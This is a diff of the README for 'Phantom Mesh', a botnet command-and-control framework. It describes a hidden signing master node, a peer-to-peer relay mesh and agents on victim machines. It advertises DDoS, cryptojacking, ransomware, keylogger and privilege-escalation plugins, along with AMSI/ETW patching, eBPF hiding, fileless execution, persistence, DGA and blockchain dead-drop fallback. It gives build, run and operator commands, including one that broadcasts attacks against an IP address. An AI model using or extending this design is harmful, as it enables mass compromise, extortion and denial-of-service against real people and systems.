@@ -1,303 +1,87 @@
 # Phantom Mesh
 
-A distributed, resilient command-and-control (C2) framework with modular architecture, multi-platform support, and advanced evasion capabilities.
+A distributed, resilient command-and-control framework with multi-platform support.
 
----
+## Features
 
-## Table of Contents
+- **Multi-tier Architecture**: Cloud mesh + Edge agents
+- **Cryptographic Security**: Ed25519 signed commands
+- **Resilient Bootstrap**: 5 fallback discovery methods
+- **Cross-platform**: Windows, Linux, macOS
+- **Stealth**: eBPF hiding, process ghosting, fileless execution
+- **Plugin System**: DDoS, cryptojacking, privilege escalation
 
-- [Architecture Overview](#architecture-overview)
-- [Node Types](#node-types)
-- [Network Topology](#network-topology)
-- [Plugin System](#plugin-system)
-- [Bootstrap Mechanism](#bootstrap-mechanism)
-- [Stealth Subsystem](#stealth-subsystem)
-- [Protocol Specification](#protocol-specification)
-- [Build Instructions](#build-instructions)
-- [Smart Contract](#smart-contract)
-- [Directory Structure](#directory-structure)
+## Quick Start
 
----
+### 1. Build
 
-## Architecture Overview
-
-Phantom Mesh implements a **two-tier distributed architecture** with a hidden operator node:
-
-```
-┌────────────────────────────────────────────────────────────────────────┐
-│                            CONTROL PLANE                               │
-│                       Cloud P2P Mesh (UDP 31337)                       │
-│                                                                        │
-│   ┌───────────┐       ┌───────────┐       ┌───────────────────┐        │
-│   │   Cloud   │◄─────►│   Cloud   │◄─────►│      PHANTOM      │        │
-│   │   Node    │  P2P  │   Node    │  P2P  │   (Hidden Master) │        │
-│   │   (Zig)   │       │   (Zig)   │       │       (Rust)      │        │
-│   └─────┬─────┘       └─────┬─────┘       └─────────┬─────────┘        │
-│         │                   │                       │                  │
-│   ┌─────┴─────┐       ┌─────┴─────┐       ┌─────────┴─────────┐        │
-│   │  Verify   │       │  Verify   │       │    PRIVATE KEY    │        │
-│   │  + Relay  │       │  + Relay  │       │    Sign + Send    │        │
-│   └─────┬─────┘       └─────┬─────┘       └─────────┬─────────┘        │
-│         │                   │                       │                  │
-│         │                   │                       │ SSH (Operator)   │
-│         │    (Identical P2P packets)                ▼                  │
-│         │                   │             ┌───────────────┐            │
-│         │                   │             │    Operator   │            │
-│         │                   │             │    Terminal   │            │
-│         │                   │             └───────────────┘            │
-└─────────┼───────────────────┼──────────────────────────────────────────┘
-          │                   │
-          └─────────┬─────────┘
-                    │ MQTT (Leader → Cloud)
-                    ▼
-┌────────────────────────────────────────────────────────────────────────┐
-│                           EXECUTION PLANE                              │
-│                     Edge Nodes (Rust) — Agents                         │
-│                                                                        │
-│  ┌──────────────────────────────────────────────────────────────────┐  │
-│  │                      LAN CLUSTER                                 │  │
-│  │                                                                  │  │
-│  │   ╔════════════════════════════════════════════════════════════╗ │  │
-│  │   ║  P2P DISCOVERY LAYER (Always Running)                      ║ │  │
-│  │   ║  • UDP Broadcast 31338: Election protocol                  ║ │  │
-│  │   ║  • Passive sniffing: mDNS/SSDP/NetBIOS (ports 5353,1900)   ║ │  │
-│  │   ║  • Covert handshake: TCP 9631 (magic 0xCDCECF6D)           ║ │  │
-│  │   ╚════════════════════════════════════════════════════════════╝ │  │
-│  │                                                                  │  │
-│  │   ┌──────────┐       ┌──────────┐       ┌──────────┐            │  │
-│  │   │  Edge A  │◄─UDP─►│  Edge B  │◄─UDP─►│  Edge C  │            │  │
-│  │   │  rank=42 │       │  rank=99 │       │  rank=7  │            │  │
-│  │   └──────────┘       └──────────┘       └──────────┘            │  │
-│  │        │                   │                   │                 │  │
-│  │        │     WHO_IS_LEADER │ (broadcast)       │                 │  │
-│  │        │◄──────────────────┼───────────────────►│                │  │
-│  │        │                   │                   │                 │  │
-│  │        │   I_AM_LEADER     │ (rank 99 wins)    │                 │  │
-│  │        │◄──────────────────┤                   │                 │  │
-│  │        │                   │                   │                 │  │
-│  │        ▼                   ▼                   ▼                 │  │
-│  │   ┌──────────┐       ┌──────────┐       ┌──────────┐            │  │
-│  │   │  WORKER  │       │  LEADER  │       │  WORKER  │            │  │
-│  │   └────┬─────┘       └────┬─────┘       └────┬─────┘            │  │
-│  │        │                  │                  │                   │  │
-│  │        │◄───Unix Socket───┤───Unix Socket───►│                   │  │
-│  │        │  (LIPC protocol) │                  │                   │  │
-│  │                           │                                      │  │
-│  │                           │ MQTT to Cloud (6 parallel)           │  │
-│  │                           │ Nonce-based deduplication            │  │
-│  │                           │ Heartbeat every 30s                  │  │
-│  │                           ▼                                      │  │
-│  └──────────────────────────────────────────────────────────────────┘  │
-└────────────────────────────────────────────────────────────────────────┘
-
-LAN Cluster Details:
-  • P2P discovery runs continuously (election.rs, zero_noise.rs)
-  • Election: UDP broadcast WHO_IS_LEADER on port 31338, wait 3s, highest rank claims LEADER
-  • LIPC protocol: Magic 0xF4240D11, types: Hello (0x01), Data (0x02), Heartbeat (0x03)
-  • Workers connect to Leader via Unix Domain Socket (/tmp/phantom_edge.sock)
-  • Leader uses MultiCloudManager to connect up to 6 Cloud nodes simultaneously
-  • Outgoing messages broadcast to ALL connected Clouds (via tokio broadcast channel)
-  • Incoming commands deduplicated by nonce bytes [1:5] (LRU cache 256, cmd < 5 bytes = no dedup)
-  • Bootstrap resolution cached to /var/tmp/.phantom_nodes (Linux) or C:\ProgramData\Phantom\ (Windows)
-```
-
-### Key Insight: Phantom Blends Into Cloud Mesh
-
-| Node | P2P Participation | Routing Table | Gossip | Command Signing |
-|------|-------------------|---------------|--------|-----------------|
-| **Cloud (Zig)** | ✅ | ✅ | ✅ | ❌ Verify only |
-| **Phantom (Rust)** | ✅ | ✅ | ✅ | ✅ **Has private key** |
-
-- Phantom is **indistinguishable** from other Cloud nodes in the mesh
-- All nodes verify signatures with the same public key
-- Only Phantom can **produce** valid signatures (holds private key)
-- Operator connects to Phantom via SSH to issue commands
-
----
-
-## Node Types
-
-### Cloud Node (`crates/nodes/cloud`)
-**Language**: Zig  
-**Role**: Mesh participant, signature verifier, Edge relay
-
-Standard mesh node that:
-- Participates in P2P gossip (UDP 31337)
-- Maintains neighbor routing table
-- **Verifies** Ed25519 signatures on commands
-- Relays commands to connected Edge nodes
-- Runs scanner, proxy, attack modules
-
-### Phantom Node (`crates/nodes/phantom`)
-**Language**: Rust  
-**Role**: **Hidden master** within Cloud mesh
-
-Phantom is a Cloud node that:
-- Participates in **same P2P mesh** as Cloud nodes
-- Maintains neighbor routing table (identical protocol)
-- Gossips with Cloud nodes (appears as regular peer)
-- **Signs** commands with master private key
-- Provides SSH shell for operator (port 12961)
-- Can broadcast to Sepolia blockchain for fallback
-
-**Phantom looks like a Cloud node but holds the signing key.**
-
-### Edge Node (`crates/nodes/edge`)
-**Language**: Rust  
-**Role**: Target agent, local cluster coordination
-
-- Connects to **any** Cloud/Phantom node (no distinction)
-- Leader election within local network
-- Workers connect to Leader via IPC
-- Executes plugins and tasks
-
----
-
-## Network Topology
-
-### Command Flow
-
-```
-1. OPERATOR → PHANTOM
-   ssh admin@phantom -p 12961
-   PhantomC2$ attack 1.2.3.4 80 60
-
-2. PHANTOM SIGNS & BROADCASTS
-   - Creates P2PCommand packet
-   - Signs payload with Ed25519 private key
-   - Sends to neighbors (standard gossip)
-
-3. CLOUD MESH PROPAGATION
-   - Cloud nodes receive packet
-   - Verify signature (same pubkey as Phantom)
-   - Check nonce (replay protection)
-   - Flood to 3 random neighbors
-   - Execute attack locally
-
-4. EDGE EXECUTION
-   - Edge Leaders receive via MQTT
-   - Dispatch to plugins
-   - Bridge to Workers
-```
-
-### Port Allocation
-
-| Port | Protocol | Used By | Purpose |
-|------|----------|---------|---------|
-| **31337** | UDP | Cloud + Phantom | P2P gossip mesh |
-| **12961** | TCP/SSH | Phantom only | Operator shell |
-| **31338** | UDP | Edge | Leader election |
-| **9631** | TCP | Edge | Covert peer discovery |
-
-### P2P Protocol (Cloud & Phantom)
-
-Both Cloud and Phantom use identical wire protocol:
-
-```
-Packet Types:
-┌────────────┬───────────────────────────────────────────────────────┐
-│ GOSSIP     │ [Magic][Type][Count][IP:Port pairs...]                │
-│ COMMAND    │ [Magic][Type][Nonce][Signature][Length][Payload]      │
-│ CONFIG     │ [Magic][Encrypted blob with signature]                │
-└────────────┴───────────────────────────────────────────────────────┘
-
-Magic: 0x597B92A8 (Big Endian)
-Signature: 64 bytes Ed25519
-Nonce: 4 bytes (replay protection)
-```
-
----
-
-## Plugin System
-
-| Plugin | Description |
-|--------|-------------|
-| **DDoS** | Distributed denial-of-service |
-| **Cryptojacking** | Cryptocurrency mining |
-| **Ransomware** | File encryption |
-| **Keylogger** | Keystroke capture |
-| **PrivEsc** | 4 CVE exploits (Dirty Pipe, PwnKit, etc.) |
-
----
-
-## Bootstrap Mechanism
-
-Edge discovers Cloud/Phantom addresses via 5 tiers:
-
-| Tier | Method |
-|------|--------|
-| 0 | Local cache |
-| 1 | DNS-over-HTTPS |
-| 2 | Reddit tags |
-| 3 | DGA |
-| 4 | Ethereum Sepolia |
-
-All bootstrap payloads signed with same master key.
-
----
-
-## Stealth Subsystem
-
-### Windows
-- Indirect syscalls, process ghosting
-- ETW/AMSI patching
-- COM hijacking, NTFS ADS
-
-### Linux
-- memfd fileless execution
-- Systemd generator persistence
-- eBPF hiding
-
----
-
-## Build Instructions
-
-### Cloud (Mesh Node)
 ```bash
+# Cloud node (Zig)
 make cloud_linux_x64
-```
 
-### Phantom (Master Node)
-```bash
+# Phantom C2 (Rust)
 cargo build -p phantom --release
-./target/release/phantom --key keys/ --port 12961
-```
 
-### Edge (Agent)
-```bash
+# Edge agent (Rust)
 cargo build -p edge --release
 ```
 
----
+### 2. Generate Keys
 
-## Smart Contract
-
-Sepolia dead-drop for fallback C2:
-```
-PhantomC2$ signal 5.6.7.8:31337
-[+] Sepolia Signal Sent!
+```bash
+mkdir -p keys
+openssl rand 32 > keys/phantom_c2.key
 ```
 
----
+### 3. Run
 
-## Directory Structure
+```bash
+# Start Phantom C2
+./target/release/phantom --key keys/ --port 12961
+
+# Connect as operator
+ssh admin@<phantom-ip> -p 12961
+```
+
+### 4. Commands
+
+```
+PhantomC2$ help
+Available:
+  .attack <ip> <port> <duration>  - Broadcast attack to mesh
+  .onchain <ip:port>[,ip:port]... - Publish C2 addresses to blockchain
+  .count                          - Count all nodes in mesh
+  .peers                          - List direct P2P peers
+```
+
+## Network Ports
+
+| Port | Protocol | Purpose |
+|------|----------|---------|
+| 12961 | TCP | SSH C2 (Phantom) |
+| 31337 | UDP | P2P mesh (Cloud) |
+| 31338 | UDP | P2P mesh (Phantom) |
+| 1883 | TCP | Edge proxy |
+
+## Documentation
+
+- [Architecture](docs/ARCHITECTURE.md) - Detailed technical design
+- [Smart Contract](smart_contracts/) - Sepolia dead-drop
+
+## Project Structure
 
 ```
 phantom-mesh/
 ├── crates/
 │   ├── nodes/
-│   │   ├── cloud/      # Mesh node (Zig) - verifies signatures
-│   │   ├── phantom/    # Hidden master (Rust) - signs commands
-│   │   └── edge/       # Target agent (Rust)
-│   ├── plugins/
-│   │   └── privesc/    # 4 CVE exploits
-│   └── shared/
-│       └── protocol/   # Wire format
-└── smart_contracts/
-    └── signal.sol
+│   │   ├── cloud/      # Mesh node (Zig)
+│   │   ├── phantom/    # C2 master (Rust)
+│   │   └── edge/       # Agent (Rust)
+│   ├── plugins/        # DDoS, privesc, etc.
+│   └── shared/         # Protocol, plugin API
+├── smart_contracts/    # Sepolia fallback
+└── docs/               # Architecture docs
 ```
-
----
 
 ## License
 
